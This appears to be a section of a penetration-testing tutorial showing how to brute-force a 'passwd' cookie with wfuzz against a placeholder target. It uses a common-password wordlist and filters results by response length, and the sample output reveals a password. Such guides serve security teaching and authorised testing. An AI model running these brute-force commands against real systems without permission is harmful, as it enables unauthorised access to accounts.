## Fuzzing Cookies
We can easily fuzz cookies with [wfuzz](https://github.com/xmendez/wfuzz). To view your cookie values, click on the [Cookie Quick Manager](https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/) installed in Firefox in Demon Linux. Next, grab the name and value of the cookie. Say, we want to fuzz the "passwd" cookie. We can do so with,
```
root@attacker-machine:~# wfuzz -z \
 file,/infosec/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt\
 -b passwd=FUZZ http://(TARGET IP ADDRESS):(TARGET PORT)
```
This will run though the word list of 10-million-password-list-top-500.txt and replace the cookie value, passwd, with the value from the wordlist and attempt to make a new HTTP request using that new cookie value. This will return a LOT of strings like so,
```
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://(TARGET IP ADDRESS):(TARGET PORT)
Total requests: 500

==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

00000:  C=000     14 L	      29 W	    324 Ch	  "12345678"
00001:  C=000     14 L	      29 W	    324 Ch	  "qwerty"
00002:  C=000     14 L	      29 W	    324 Ch	  "123456789"
00003:  C=000     14 L	      29 W	    324 Ch	  "12345"
00004:  C=000     14 L	      29 W	    324 Ch	  "1234567"
00005:  C=000     14 L	      29 W	    324 Ch	  "1234"
00006:  C=000     14 L	      29 W	    324 Ch	  "123456"
00007:  C=000     14 L	      29 W	    324 Ch	  "111111"
00008:  C=000     14 L	      29 W	    324 Ch	  "password"
00009:  C=000     14 L	      29 W	    324 Ch	  "dragon"
00010:  C=000     14 L	      29 W	    324 Ch	  "123123"
00011:  C=000     14 L	      29 W	    324 Ch	  "123321"
00012:  C=000     14 L	      29 W	    324 Ch	  "mustang"
```
As you can see, they all have something in common - the Character length of 324 is returned from the server after we make each HTTP request with the new cookie. So, we need to filter out these false-positives using the `--hh` filter as so,
```
root@attacker-machine:~# wfuzz --hh 324 -z \
 file,/infosec/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt\
 -b passwd=FUZZ http://(TARGET IP ADDRESS):(TARGET PORT)
```
This will now be much cleaner responses, like the following terminal listing,
```
root@attacker-machine:~# wfuzz --hh 324 -z \
 file,/infosec/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt\
 -b passwd=FUZZ http://(TARGET IP ADDRESS):(TARGET PORT) 
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://(TARGET IP ADDRESS):(TARGET PORT)
Total requests: 500

==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

00475:  C=000     21 L	      48 W	    540 Ch	  "SuperSecretPass123"

Total time: 1.719570
Processed Requests: 500
Filtered Requests: 499
Requests/sec.: 290.7702

root@attacker-machine:~#
```
